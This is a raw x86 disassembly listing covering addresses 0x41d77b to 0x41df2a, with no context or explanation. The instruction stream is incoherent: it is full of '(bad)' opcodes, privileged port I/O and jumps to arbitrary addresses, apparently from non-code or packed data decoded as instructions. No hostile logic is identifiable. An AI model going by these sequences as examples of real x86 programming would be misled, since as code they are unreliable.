  41d77b:	into   
  41d77c:	in     al,0x53
  41d77e:	out    dx,al
  41d77f:	dec    edx
  41d780:	into   
  41d781:	dec    edi
  41d782:	push   ds
  41d783:	xlat   BYTE PTR ds:[ebx]
  41d784:	pop    eax
  41d785:	mov    esp,0x7ed8abc4
  41d78a:	rcl    BYTE PTR ds:0xed22f058,0x74
  41d791:	pusha  
  41d792:	ror    DWORD PTR [esi-0x3b],1
  41d795:	pop    edi
  41d796:	sbb    BYTE PTR [edi+ebp*8],0x25
  41d79a:	jmp    0x41d7db
  41d79c:	jne    0x41d816
  41d79e:	push   es
  41d79f:	not    BYTE PTR [ebp-0x80]
  41d7a2:	inc    eax
  41d7a3:	inc    bx
  41d7a5:	add    edx,eax
  41d7a7:	xchg   edx,eax
  41d7a8:	loop   0x41d758
  41d7aa:	sub    eax,0xb80f09fd
  41d7af:	scas   eax,DWORD PTR es:[edi]
  41d7b0:	mov    esi,DWORD PTR [esi-0x1daac743]
  41d7b6:	ret    
  41d7b7:	ret    0x7127
  41d7ba:	cmp    BYTE PTR ss:[ebx],ah
  41d7bd:	mov    ebx,0x39155887
  41d7c2:	fdivr  DWORD PTR [ebx+0x8]
  41d7c5:	jne    0x41d7d6
  41d7c7:	iret   
  41d7c8:	push   edx
  41d7c9:	add    al,0xa8
  41d7cb:	cmp    eax,DWORD PTR [eax+0x55]
  41d7ce:	add    eax,0xd9072da6
  41d7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7d4:	add    al,0xe6
  41d7d6:	jl     0x41d7f4
  41d7d8:	jmp    0x3a66c520
  41d7dd:	fidivr DWORD PTR [ebx+0x2a]
  41d7e0:	enter  0xdf8f,0x75
  41d7e4:	test   bh,0x3b
  41d7e7:	sub    al,0xa7
  41d7e9:	loop   0x41d854
  41d7eb:	jle    0x41d85c
  41d7ed:	clc    
  41d7ee:	ins    DWORD PTR es:[edi],dx
  41d7ef:	fs mov ebp,0x9e154a07
  41d7f5:	js     0x41d860
  41d7f7:	sbb    DWORD PTR [esi],ebx
  41d7f9:	add    DWORD PTR [ecx+0x61798743],eax
  41d7ff:	cmp    bl,BYTE PTR [ebx]
  41d801:	cmp    esi,ecx
  41d803:	or     ebx,DWORD PTR [edx]
  41d805:	scas   al,BYTE PTR es:[edi]
  41d806:	inc    esi
  41d807:	mov    ?,WORD PTR [edi-0x15]
  41d80a:	je     0x41d83e
  41d80c:	mov    ds:0x5cf0913,eax
  41d811:	mov    esi,0x3accb37f
  41d816:	dec    edx
  41d817:	div    BYTE PTR [ebp+0x3d]
  41d81a:	push   edi
  41d81b:	jmp    0xc3832bf0
  41d820:	dec    esi
  41d821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d822:	stos   BYTE PTR es:[edi],al
  41d823:	and    DWORD PTR [edx],eax
  41d825:	cmp    al,0x73
  41d827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d828:	imul   ebx,DWORD PTR [eax-0x1ee3e14a],0x45
  41d82f:	cmp    edx,esp
  41d831:	retf   0xacf8
  41d834:	imul   edx,DWORD PTR [ebp+eiz*2-0x40dfd656],0xffffffd7
  41d83c:	xor    eax,0xe9947989
  41d841:	cmc    
  41d842:	xchg   BYTE PTR [ecx+ecx*8],bh
  41d845:	repnz xchg edx,eax
  41d847:	arpl   WORD PTR [ecx],bp
  41d849:	cmp    BYTE PTR [edi-0x64],bh
  41d84c:	fisttp WORD PTR [ebp+eiz*1+0x57b40053]
  41d853:	nop
  41d854:	jb     0x41d8be
  41d856:	cli    
  41d857:	dec    esp
  41d858:	adc    al,0x42
  41d85a:	mov    esp,eax
  41d85c:	dec    ebp
  41d85d:	mov    edx,0xc3d5e99
  41d862:	cli    
  41d863:	ss out dx,eax
  41d865:	cmp    edx,ebx
  41d867:	dec    ecx
  41d868:	jns    0x41d86b
  41d86a:	clc    
  41d86b:	retf   
  41d86c:	xor    dh,BYTE PTR [edx]
  41d86e:	es arpl dx,dx
  41d871:	jmp    0x41d8b7
  41d873:	hlt    
  41d874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d875:	inc    esp
  41d876:	shr    BYTE PTR [ecx-0x4e],1
  41d879:	add    al,0x4b
  41d87b:	jmp    0x78aa:0x2b7ab72b
  41d882:	mov    ch,0x73
  41d884:	add    eax,0x352990f9
  41d889:	iret   
  41d88a:	dec    ebp
  41d88b:	aad    0x32
  41d88d:	add    DWORD PTR [edi-0x5a8b5e6d],edi
  41d893:	mov    edi,edx
  41d895:	ror    BYTE PTR [edi+ebx*4-0x666fc041],0xe4
  41d89d:	xchg   esp,eax
  41d89e:	aam    0x5f
  41d8a0:	mov    eax,0x11b76c73
  41d8a5:	in     al,dx
  41d8a6:	scas   eax,DWORD PTR es:[edi]
  41d8a7:	out    0x5,eax
  41d8a9:	lahf   
  41d8aa:	repnz loop 0x41d846
  41d8ad:	adc    al,0xba
  41d8af:	pop    es
  41d8b0:	adc    DWORD PTR [ebx+0x54],esi
  41d8b3:	fistp  QWORD PTR [edi]
  41d8b5:	push   ebp
  41d8b6:	shl    DWORD PTR [edi-0x7d68f7c4],cl
  41d8bc:	add    bh,bl
  41d8be:	mov    edi,0xb3090797
  41d8c3:	dec    ebp
  41d8c4:	mov    BYTE PTR [eax+0x8],bl
  41d8c7:	add    eax,0xcba1c661
  41d8cc:	mov    edi,0x157c8efc
  41d8d1:	stc    
  41d8d2:	or     ecx,DWORD PTR [eax+0x1f]
  41d8d5:	jmp    0x41d902
  41d8d7:	or     eax,0xdfb04681
  41d8dc:	or     BYTE PTR [ebp+0x70],al
  41d8df:	jmp    0x85a1904b
  41d8e4:	push   esp
  41d8e5:	mov    ebp,0x666fd3d9
  41d8ea:	nop
  41d8eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8ec:	jg     0x41d87c
  41d8ee:	jge    0x41d8b4
  41d8f0:	pop    ds
  41d8f1:	ins    BYTE PTR es:[edi],dx
  41d8f2:	aad    0x69
  41d8f4:	dec    ecx
  41d8f5:	fistp  DWORD PTR [ebx]
  41d8f7:	fidivr DWORD PTR [edx-0x66abff00]
  41d8fd:	mov    al,ds:0x25f0e29b
  41d902:	xchg   edx,eax
  41d903:	cmp    DWORD PTR [esi+0x19],esp
  41d906:	fdivp  st(5),st
  41d908:	outs   dx,DWORD PTR ds:[esi]
  41d909:	inc    esp
  41d90a:	jbe    0x41d978
  41d90c:	xchg   esi,eax
  41d90d:	mov    edi,0xc61cbe72
  41d912:	and    ecx,edi
  41d914:	push   ebx
  41d915:	mov    dh,0x43
  41d917:	out    dx,eax
  41d918:	xor    eax,0xc9aee957
  41d91d:	repnz (bad) 
  41d91f:	in     eax,0x2
  41d921:	mov    ecx,0xd16fd6b0
  41d926:	(bad)  
  41d927:	push   ds
  41d928:	(bad)  
  41d929:	sub    DWORD PTR [eax+0xd],ebp
  41d92c:	push   0x75
  41d92e:	shr    cl,0x55
  41d931:	shl    BYTE PTR [edx],0x4b
  41d934:	and    eax,0x8666413a
  41d939:	lds    ebp,FWORD PTR [ebp-0x25dc5008]
  41d93f:	xchg   DWORD PTR [edi+eiz*2-0x7286c86c],eax
  41d946:	push   esi
  41d947:	(bad)  
  41d948:	stc    
  41d949:	and    bh,bl
  41d94b:	cs leave 
  41d94d:	adc    BYTE PTR [esi+0x1f],dh
  41d950:	test   BYTE PTR [esi+0x42],ch
  41d953:	int3   
  41d954:	mov    eax,0xfb9f8838
  41d959:	aam    0x75
  41d95b:	aam    0x9f
  41d95d:	jg     0x41d962
  41d95f:	cmp    edx,DWORD PTR es:[ebp-0x4bbdff8c]
  41d966:	and    dh,BYTE PTR [ecx-0xd5e716c]
  41d96c:	push   esi
  41d96d:	jp     0x41d96a
  41d96f:	ins    BYTE PTR es:[edi],dx
  41d970:	and    esi,DWORD PTR [edx]
  41d972:	repnz lods eax,DWORD PTR ds:[esi]
  41d974:	sahf   
  41d975:	arpl   WORD PTR [edi+0x16a1181d],sp
  41d97b:	leave  
  41d97c:	lea    ebx,[edx-0xa418735]
  41d982:	dec    edx
  41d983:	jns    0x41d9ad
  41d985:	add    ecx,edi
  41d987:	loope  0x41d90b
  41d989:	sub    esp,DWORD PTR [edx-0x44]
  41d98c:	cs ret 
  41d98e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d98f:	ffree  st(7)
  41d991:	aas    
  41d992:	xchg   esp,eax
  41d993:	inc    eax
  41d994:	jno    0x41d9af
  41d996:	or     DWORD PTR [esi-0x74],esi
  41d999:	adc    eax,0x9c5c240
  41d99e:	fwait
  41d99f:	mov    ch,BYTE PTR [eax]
  41d9a1:	daa    
  41d9a2:	fld    QWORD PTR [esi+0x2de822f8]
  41d9a8:	sar    BYTE PTR [edi+0xca27495],0xb0
  41d9af:	std    
  41d9b0:	and    ch,dl
  41d9b2:	test   BYTE PTR [ebx-0x8c7f52f],al
  41d9b8:	adc    al,0x2d
  41d9ba:	push   ss
  41d9bb:	cmc    
  41d9bc:	cdq    
  41d9bd:	sbb    eax,0x5cfa5907
  41d9c2:	retf   0x97f6
  41d9c5:	push   ebx
  41d9c6:	ret    0x9807
  41d9c9:	call   0xc0a1:0x1dba9018
  41d9d0:	xchg   esp,eax
  41d9d1:	pop    eax
  41d9d2:	imul   ebp,DWORD PTR [eax],0xffffffba
  41d9d5:	push   ss
  41d9d6:	std    
  41d9d7:	xor    DWORD PTR [ecx],edi
  41d9d9:	loopne 0x41d999
  41d9db:	mov    eax,ds:0x802277c0
  41d9e0:	adc    ecx,DWORD PTR [edi-0x1a]
  41d9e3:	sub    DWORD PTR gs:[ecx-0x30193ac9],edi
  41d9ea:	jge    0x41d9fb
  41d9ec:	pushf  
  41d9ed:	jb     0x41d9eb
  41d9ef:	mov    esp,0x8efe77
  41d9f4:	outs   dx,DWORD PTR ds:[esi]
  41d9f5:	or     BYTE PTR [edi],dl
  41d9f7:	jns    0x41d9d1
  41d9f9:	je     0x41da3a
  41d9fb:	mov    ?,WORD PTR [esp+ebx*1]
  41d9fe:	mov    al,0xba
  41da00:	fsub   DWORD PTR [esi+0x17]
  41da03:	or     BYTE PTR [eax+esi*8+0x6ec49c90],cl
  41da0a:	mov    al,ss:0xdc04380b
  41da10:	mov    dh,0x30
  41da12:	or     edx,DWORD PTR ss:[esi]
  41da15:	cs cwde 
  41da17:	das    
  41da18:	nop
  41da19:	test   DWORD PTR [ebx-0xa],0x44535677
  41da20:	pop    esp
  41da21:	nop
  41da22:	retf   0xf1d8
  41da25:	xchg   DWORD PTR [esi+0x16],esi
  41da28:	pusha  
  41da29:	fs or  al,0x89
  41da2c:	sahf   
  41da2d:	xor    al,0x4f
  41da2f:	rcr    BYTE PTR [edi+0x7ae4b10a],0x3f
  41da36:	pop    ebp
  41da37:	test   bh,0x28
  41da3a:	stos   BYTE PTR es:[edi],al
  41da3b:	pushf  
  41da3c:	outs   dx,DWORD PTR ds:[esi]
  41da3d:	mov    ch,0xaa
  41da3f:	pop    eax
  41da40:	jge    0x41da36
  41da42:	int    0xf
  41da44:	aam    0x25
  41da46:	gs cmp al,0xae
  41da49:	mov    dh,0x80
  41da4b:	push   edi
  41da4c:	shr    DWORD PTR [esi+0x65a3c8e5],1
  41da52:	push   ebp
  41da53:	stc    
  41da54:	sti    
  41da55:	xchg   DWORD PTR [eax-0x2],ecx
  41da58:	pop    ebx
  41da59:	fistp  DWORD PTR [ebx+0x46ee062a]
  41da5f:	enter  0x9310,0xc3
  41da63:	jg     0x41da7e
  41da65:	push   0xffffffe4
  41da67:	(bad)  
  41da68:	iret   
  41da69:	push   0x6b8d9617
  41da6e:	ror    DWORD PTR [eax],1
  41da70:	jle    0x41dada
  41da72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da73:	sbb    ah,dh
  41da75:	mov    ds:0xebad37ab,eax
  41da7a:	dec    BYTE PTR [edx-0x55]
  41da7d:	mov    edx,0xd8b509d7
  41da82:	bound  ebx,QWORD PTR [ebx-0x55]
  41da85:	scas   eax,DWORD PTR es:[edi]
  41da86:	sbb    eax,0x3d0a9713
  41da8b:	and    ebx,DWORD PTR [ebp+0x4be494af]
  41da91:	push   ebx
  41da92:	jmp    0x1dcd0127
  41da97:	mov    al,ds:0x9e4f3
  41da9c:	sub    ch,BYTE PTR [ecx+0x53a8d145]
  41daa2:	mov    eax,0x1db922a7
  41daa7:	out    dx,al
  41daa8:	xchg   ecx,eax
  41daa9:	(bad)
  41daac:	jl     0x41da9a
  41daae:	bound  edx,QWORD PTR [eax+0x29227923]
  41dab4:	xchg   ebp,eax
  41dab5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dab6:	jno    0x41da99
  41dab8:	jno    0x41daa4
  41daba:	or     BYTE PTR [edi],cl
  41dabc:	inc    ecx
  41dabd:	pop    ss
  41dabe:	cmp    ecx,ecx
  41dac0:	pop    ebp
  41dac1:	sbb    ecx,DWORD PTR [eax+0x4d]
  41dac4:	add    eax,0xebd74819
  41dac9:	adc    bh,BYTE PTR fs:[edx-0x264106ab]
  41dad0:	out    dx,al
  41dad1:	rcl    BYTE PTR [eax-0x54],cl
  41dad4:	push   es
  41dad5:	cmp    dh,dh
  41dad7:	xor    eax,0xad09f709
  41dadc:	jl     0x41da63
  41dade:	xchg   ebx,eax
  41dadf:	and    al,0xd0
  41dae1:	sbb    BYTE PTR [eax+0x661a5b73],0x96
  41dae8:	cli    
  41dae9:	pop    ebx
  41daea:	push   eax
  41daeb:	cmp    al,0x82
  41daed:	out    dx,eax
  41daee:	pop    es
  41daef:	sahf   
  41daf0:	rcl    DWORD PTR [ebx],0x2c
  41daf3:	hlt    
  41daf4:	(bad)  
  41daf6:	pop    ebx
  41daf7:	fsubp  st(3),st
  41daf9:	mov    dh,0xac
  41dafb:	imul   ecx,DWORD PTR [ecx-0x4dbf7503],0x483f6b2b
  41db05:	cmp    eax,0xb96462ac
  41db0a:	bound  ecx,QWORD PTR [ebx]
  41db0c:	cmp    bh,ch
  41db0e:	outs   dx,DWORD PTR ds:[esi]
  41db0f:	loop   0x41db55
  41db11:	mov    gs,eax
  41db13:	aam    0x42
  41db15:	push   esi
  41db16:	jp     0x41db50
  41db18:	xchg   edx,eax
  41db19:	dec    edi
  41db1a:	fs xchg edi,eax
  41db1c:	pop    ecx
  41db1d:	mov    BYTE PTR [eax+0x61],dh
  41db20:	iret   
  41db21:	(bad)  
  41db22:	push   ecx
  41db23:	ds inc ecx
  41db25:	jo     0x41db39
  41db27:	dec    ecx
  41db28:	inc    ebp
  41db29:	push   edi
  41db2a:	cmp    ebx,DWORD PTR [edi-0x68c12340]
  41db30:	push   eax
  41db31:	fwait
  41db32:	jns    0x41db48
  41db34:	int    0xd
  41db36:	push   ebp
  41db37:	in     eax,0x4f
  41db39:	ins    BYTE PTR es:[edi],dx
  41db3a:	push   0x34aa39e8
  41db3f:	xchg   ecx,eax
  41db40:	ficom  WORD PTR [eax+0x1c03a277]
  41db46:	inc    esi
  41db47:	scas   eax,DWORD PTR es:[edi]
  41db48:	call   0xc207:0x9f7f4389
  41db4f:	pop    eax
  41db50:	retf   
  41db51:	lods   eax,DWORD PTR ds:[esi]
  41db52:	fs mov esp,0x1b2a33e9
  41db58:	push   0x9409af43
  41db5d:	dec    edi
  41db5e:	ins    DWORD PTR es:[edi],dx
  41db5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db60:	out    dx,al
  41db61:	nop
  41db62:	xor    al,0x7c
  41db64:	xchg   ebx,eax
  41db65:	rol    DWORD PTR [ecx+0x1f9a5734],cl
  41db6b:	push   0x35d12383
  41db70:	jmp    0xb3f6:0xe5d9bc49
  41db77:	jg     0x41db2f
  41db79:	shl    BYTE PTR [ecx+0x3a6b6ef5],0x64
  41db80:	out    0x7b,al
  41db82:	in     al,0x31
  41db84:	push   ecx
  41db85:	popa   
  41db86:	in     eax,dx
  41db87:	fisttp WORD PTR [esi-0x7d69ac46]
  41db8d:	lea    edi,[ecx+esi*2-0x80]
  41db91:	scas   al,BYTE PTR es:[edi]
  41db92:	mov    BYTE PTR [ebx],ch
  41db94:	xchg   ebx,eax
  41db95:	fistp  QWORD PTR [ebp+ecx*4-0x2c0f6b76]
  41db9c:	and    al,0x10
  41db9e:	push   ss
  41db9f:	and    DWORD PTR [ebp+0x225f529e],0xd2ab300a
  41dba9:	mov    bh,BYTE PTR [esi-0x6]
  41dbac:	sbb    eax,0x99047afc
  41dbb1:	xlat   BYTE PTR ds:[ebx]
  41dbb2:	dec    edi
  41dbb3:	ret    
  41dbb4:	cmp    DWORD PTR [edx],ebp
  41dbb6:	(bad)  
  41dbb8:	in     al,0xdf
  41dbba:	cmp    eax,0xc5974667
  41dbbf:	ss pop sp
  41dbc2:	(bad)  
  41dbc3:	sub    eax,0x61ceea5b
  41dbc8:	mov    esp,0xe0c9bc1
  41dbcd:	out    0xce,al
  41dbcf:	add    eax,0xcc9efe06
  41dbd4:	fisub  WORD PTR [edi-0x18]
  41dbd7:	mov    al,0x32
  41dbd9:	or     edx,DWORD PTR [ebx+0x5e82cb43]
  41dbdf:	mov    edi,0x2c678f7d
  41dbe4:	ds adc edx,eax
  41dbe7:	ficomp WORD PTR [edi]
  41dbe9:	mov    al,0x64
  41dbeb:	and    eax,0x257b0b60
  41dbf0:	inc    edx
  41dbf1:	pop    ecx
  41dbf2:	or     bh,al
  41dbf4:	mov    eax,0x2a968d45
  41dbf9:	mov    ah,0x50
  41dbfb:	out    0x1c,eax
  41dbfd:	lods   eax,DWORD PTR ds:[esi]
  41dbfe:	das    
  41dbff:	mov    ecx,0x58f8d0af
  41dc04:	jl     0x41dc2b
  41dc06:	mov    dl,0xe5
  41dc08:	ret    
  41dc09:	fs mov ecx,0xa7e6b2aa
  41dc0f:	jp     0x41dbc9
  41dc11:	mov    edx,0xcdcc3163
  41dc16:	add    dl,BYTE PTR [ecx+0x462dfe27]
  41dc1c:	cs jb  0x41dc94
  41dc1f:	mov    edi,0xcd574f3c
  41dc24:	pop    ebx
  41dc25:	pop    edi
  41dc26:	into   
  41dc27:	push   cs
  41dc28:	add    eax,0xef8a6347
  41dc2d:	enter  0xcfea,0x9e
  41dc31:	cmc    
  41dc32:	fimul  WORD PTR [ebx*8+0x71807275]
  41dc39:	jecxz  0x41dbc1
  41dc3b:	xlat   BYTE PTR ds:[ebx]
  41dc3c:	sub    BYTE PTR [eax+eiz*4+0x4],ah
  41dc40:	in     al,0x51
  41dc42:	mov    ebp,0x76f81118
  41dc47:	sti    
  41dc48:	pop    eax
  41dc49:	shl    BYTE PTR [ebx],cl
  41dc4b:	push   edx
  41dc4c:	pop    ds
  41dc4d:	xor    DWORD PTR [edi-0x295f5d54],edx
  41dc53:	les    edi,FWORD PTR [edi]
  41dc55:	xor    ah,BYTE PTR [esi]
  41dc57:	push   esp
  41dc58:	aam    0xbb
  41dc5a:	adc    eax,0x4fdb5c3d
  41dc5f:	div    DWORD PTR [eax-0x55]
  41dc62:	enter  0x4e0a,0x38
  41dc66:	xlat   BYTE PTR ds:[ebx]
  41dc67:	mov    bh,0x5
  41dc69:	mov    edx,esi
  41dc6b:	int    0x7a
  41dc6d:	sub    edx,DWORD PTR [edi]
  41dc6f:	mov    ebx,0xd8df035a
  41dc74:	in     eax,0x57
  41dc76:	jmp    0x75f3f78a
  41dc7b:	in     eax,0x8a
  41dc7d:	sbb    edi,esi
  41dc7f:	mov    dh,0x78
  41dc81:	jmp    0x41dc78
  41dc83:	pop    edi
  41dc84:	fbld   TBYTE PTR [esi+0x6d]
  41dc87:	shr    DWORD PTR [eax+0x1f],cl
  41dc8a:	cmp    eax,0x9ab887ed
  41dc8f:	leave  
  41dc90:	popa   
  41dc91:	iret   
  41dc92:	mov    ?,edx
  41dc94:	pop    ss
  41dc95:	xor    esp,DWORD PTR [edx-0x59e8891e]
  41dc9b:	enter  0x980b,0xe6
  41dc9f:	std    
  41dca0:	aad    0x8d
  41dca2:	fcmovu st,st(5)
  41dca4:	fwait
  41dca5:	std    
  41dca6:	div    BYTE PTR [ecx+0x39]
  41dca9:	sub    DWORD PTR [eax-0x36],eax
  41dcac:	push   edi
  41dcad:	inc    BYTE PTR ds:0x6e1ded25
  41dcb3:	sahf   
  41dcb4:	cmp    eax,0x77f0677f
  41dcb9:	mov    esi,0xa792f9b7
  41dcbe:	xor    dh,BYTE PTR [esi]
  41dcc0:	loopne 0x41dc54
  41dcc2:	adc    eax,0xbe0bd94b
  41dcc7:	in     eax,0x7f
  41dcc9:	out    dx,eax
  41dcca:	mov    dh,cl
  41dccc:	outs   dx,DWORD PTR ds:[esi]
  41dccd:	xor    dh,BYTE PTR [edx+eax*2-0x11]
  41dcd1:	stos   BYTE PTR es:[edi],al
  41dcd2:	add    dl,cl
  41dcd4:	pop    ecx
  41dcd5:	and    al,0x27
  41dcd7:	retf   
  41dcd8:	ja     0x41dcaa
  41dcda:	pop    esi
  41dcdb:	mov    eax,ecx
  41dcdd:	dec    ebp
  41dcde:	mov    ss,ebx
  41dce0:	icebp  
  41dce1:	dec    edi
  41dce2:	ficom  WORD PTR [edi-0x63508e0c]
  41dce8:	xchg   esp,eax
  41dce9:	mov    eax,DWORD PTR [esi+0x37]
  41dcec:	into   
  41dced:	std    
  41dcee:	imul   ebp,ebx,0x1dc616ea
  41dcf4:	mov    esi,0x8b20408b
  41dcf9:	inc    ebx
  41dcfa:	and    DWORD PTR [ebp+ebx*1-0x6583f859],ebx
  41dd01:	ss out 0x82,al
  41dd04:	jl     0x41dd39
  41dd06:	adc    BYTE PTR [ecx+0x1e],ah
  41dd09:	adc    BYTE PTR [ebx],al
  41dd0b:	into   
  41dd0c:	jnp    0x41dd48
  41dd0e:	(bad)  
  41dd0f:	pop    esi
  41dd10:	inc    edx
  41dd11:	test   al,0x5a
  41dd13:	adc    esi,DWORD PTR [ebx+0x443f9ef9]
  41dd19:	pop    esi
  41dd1a:	inc    ecx
  41dd1b:	push   ss
  41dd1c:	fxch   st(6)
  41dd1e:	xchg   DWORD PTR [esi],ebx
  41dd20:	stos   DWORD PTR es:[edi],eax
  41dd21:	push   ecx
  41dd22:	adc    al,0x94
  41dd24:	push   edi
  41dd25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd26:	adc    al,0xb4
  41dd28:	aad    0x64
  41dd2a:	retf   
  41dd2b:	inc    edi
  41dd2c:	push   edx
  41dd2d:	mov    dh,0x22
  41dd2f:	mov    eax,ds:0x4d9bf9c0
  41dd34:	gs (bad) 
  41dd36:	inc    edx
  41dd37:	call   0x233bd046
  41dd3c:	push   esi
  41dd3d:	sbb    al,0xc4
  41dd3f:	mov    fs,WORD PTR [esi+0x25545b8]
  41dd45:	scas   eax,DWORD PTR es:[edi]
  41dd46:	ror    DWORD PTR [edi],cl
  41dd48:	or     esi,eax
  41dd4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd4b:	jle    0x41dcf3
  41dd4d:	and    BYTE PTR ds:0x8a70565b,0x62
  41dd54:	mov    bh,0xe4
  41dd56:	jmp    0x41dd49
  41dd58:	les    eax,FWORD PTR [ebx+0x6ca85476]
  41dd5e:	hlt    
  41dd5f:	dec    esp
  41dd60:	jb     0x41dd61
  41dd62:	mov    edi,0xad7ae092
  41dd67:	clc    
  41dd68:	or     esp,edx
  41dd6a:	push   eax
  41dd6b:	loop   0x41dd95
  41dd6d:	(bad)  
  41dd6e:	cld    
  41dd6f:	iret   
  41dd70:	iret   
  41dd71:	dec    esp
  41dd72:	into   
  41dd73:	inc    esi
  41dd74:	push   ebp
  41dd75:	ss jb  0x41ddf7
  41dd78:	or     al,0xe0
  41dd7a:	cld    
  41dd7b:	adc    al,0x3a
  41dd7d:	mov    eax,0x8c16fe7c
  41dd82:	sti    
  41dd83:	in     al,dx
  41dd84:	cld    
  41dd85:	mov    dl,0xde
  41dd87:	mul    ah
  41dd89:	pushf  
  41dd8a:	or     eax,0x219f36ca
  41dd8f:	fs push 0xffffff98
  41dd92:	iret   
  41dd93:	or     eax,0x9de692dd
  41dd98:	aaa    
  41dd99:	mov    eax,ds:0x66f820d5
  41dd9e:	test   al,0x95
  41dda0:	imul   edi,DWORD PTR [ebx],0xbbe3a6ac
  41dda6:	sbb    BYTE PTR [eax+edi*4],bh
  41dda9:	test   al,0xa3
  41ddab:	inc    eax
  41ddac:	add    ah,BYTE PTR [edi]
  41ddae:	fadd   st(6),st
  41ddb0:	jg     0x41ddfb
  41ddb2:	add    ecx,DWORD PTR [ecx-0x9]
  41ddb5:	scas   eax,DWORD PTR es:[edi]
  41ddb6:	dec    ebx
  41ddb7:	aam    0xde
  41ddb9:	aam    0x45
  41ddbb:	mov    ebp,0x78b5e256
  41ddc0:	xchg   BYTE PTR [eax-0x1b],ah
  41ddc3:	in     al,dx
  41ddc4:	fcmovnu st,st(2)
  41ddc6:	shl    DWORD PTR [esp+eiz*2-0x360e2f64],cl
  41ddcd:	pop    ds
  41ddce:	or     bh,dh
  41ddd0:	lods   eax,DWORD PTR ds:[esi]
  41ddd1:	dec    ebp
  41ddd2:	pushf  
  41ddd3:	and    DWORD PTR [esp+ebx*8+0x51b51f09],ecx
  41ddda:	fbstp  TBYTE PTR [eax+0x3b]
  41dddd:	call   0xee1c:0x65d04a92
  41dde4:	jns    0x41dda6
  41dde6:	pusha  
  41dde7:	(bad)  
  41dde9:	mov    esp,0xefdb13a2
  41ddee:	fcomp  QWORD PTR [eax]
  41ddf0:	hlt    
  41ddf1:	cli    
  41ddf2:	shl    DWORD PTR [esi+eax*4+0x7c1a5891],cl
  41ddf9:	aaa    
  41ddfa:	mov    al,ds:0x87a78a33
  41ddff:	cld    
  41de00:	mov    cl,0x10
  41de02:	and    eax,0xd0fe39af
  41de07:	(bad)  
  41de08:	xchg   edi,eax
  41de09:	fld    QWORD PTR [edx-0x4d]
  41de0c:	mov    WORD PTR [esi+0x4b],ss
  41de0f:	fimul  DWORD PTR [esi+ebx*1-0x140d601a]
  41de16:	or     al,0x1e
  41de18:	stos   DWORD PTR es:[edi],eax
  41de19:	test   BYTE PTR ds:0xa8e9d7e3,dl
  41de1f:	out    dx,eax
  41de20:	pop    ebp
  41de21:	xlat   BYTE PTR ds:[ebx]
  41de22:	stos   BYTE PTR es:[edi],al
  41de23:	mov    dl,0x9a
  41de25:	popa   
  41de26:	add    eax,0xe0b0b7db
  41de2b:	mov    dl,0x62
  41de2d:	addr16 add al,0x58
  41de30:	and    eax,0x3266ef8a
  41de35:	xchg   edx,eax
  41de36:	test   al,0x13
  41de38:	(bad)  
  41de3a:	mov    ds:0x1925f45a,al
  41de3f:	push   edi
  41de40:	push   ss
  41de41:	(bad)  
  41de42:	push   edi
  41de43:	bound  eax,QWORD PTR [ecx+0x60038588]
  41de49:	sahf   
  41de4a:	enter  0x9763,0x24
  41de4e:	lahf   
  41de4f:	mov    edi,0x3c292dbf
  41de54:	ficomp DWORD PTR [edi]
  41de56:	nop
  41de57:	jmp    0x41de88
  41de59:	(bad)
  41de5c:	int    0x3f
  41de5e:	xor    DWORD PTR [edx],0xffffffb1
  41de61:	mov    ebp,0xd1e01823
  41de66:	and    DWORD PTR [eax+0x2e979fc3],ecx
  41de6c:	xor    al,0xd4
  41de6e:	fxam   
  41de70:	rcr    BYTE PTR [eax-0x15],0xb1
  41de74:	cmp    ebx,0x4a3a4adb
  41de7a:	push   eax
  41de7b:	ins    DWORD PTR es:[edi],dx
  41de7c:	div    DWORD PTR [ecx-0x20]
  41de7f:	or     eax,0xf8ea7190
  41de84:	test   DWORD PTR [ecx+0x5c],esi
  41de87:	add    dl,ch
  41de89:	shl    BYTE PTR [ebx-0x6d],cl
  41de8c:	call   0x99e45f64
  41de91:	(bad)  
  41de92:	fnstenv [edx+0x1c]
  41de95:	jnp    0x41de83
  41de97:	jo     0x41de4a
  41de99:	pop    edx
  41de9a:	jmp    0x15424c1a
  41de9f:	jl     0x41dece
  41dea1:	adc    dh,BYTE PTR [edx+0x156f6168]
  41dea7:	bound  ebp,QWORD PTR [ebx+0x2787dbb0]
  41dead:	sbb    cl,BYTE PTR [ecx-0x56c37462]
  41deb3:	out    0xd4,eax
  41deb5:	sahf   
  41deb6:	hlt    
  41deb7:	mov    cs,WORD PTR [esi]
  41deb9:	mov    ecx,0x159c2a59
  41debe:	mov    ebx,0x79f2bda6
  41dec3:	ss loopne 0x41dedf
  41dec6:	popf   
  41dec7:	mov    esp,0x5f8c27ad
  41decc:	push   ebx
  41decd:	jmp    0xda8c92bc
  41ded2:	loopne 0x41defd
  41ded4:	test   DWORD PTR [edi+0x12b12e74],edi
  41deda:	jno    0x41df1c
  41dedc:	add    eax,0x31b529a8
  41dee1:	jge    0x41df0e
  41dee3:	mov    es,WORD PTR ds:0x8013b175
  41dee9:	aas    
  41deea:	push   cs
  41deeb:	pop    ecx
  41deec:	iret   
  41deed:	inc    edi
  41deee:	jl     0x41debf
  41def0:	add    BYTE PTR [edi+0x2ea3fb7b],al
  41def6:	or     al,0x64
  41def8:	cdq    
  41def9:	cmc    
  41defa:	bound  ebx,QWORD PTR [ebp+0x12ee8f8a]
  41df00:	mov    cl,0xdf
  41df02:	pop    ebp
  41df03:	addr16 inc ebx
  41df05:	in     al,0xcc
  41df07:	fadd   QWORD PTR [edi-0x44]
  41df0a:	(bad)  
  41df0b:	jge    0x41df01
  41df0d:	jmp    0x1ce35396
  41df12:	mov    ecx,0x33daad3f
  41df17:	and    eax,0x8d6f3943
  41df1c:	xor    eax,0x661eb295
  41df22:	cmp    ebp,eax
  41df24:	inc    eax
  41df25:	iret   
  41df26:	ds dec edx
  41df28:	loope  0x41dee7
  41df2a:	xchg   esi,eax
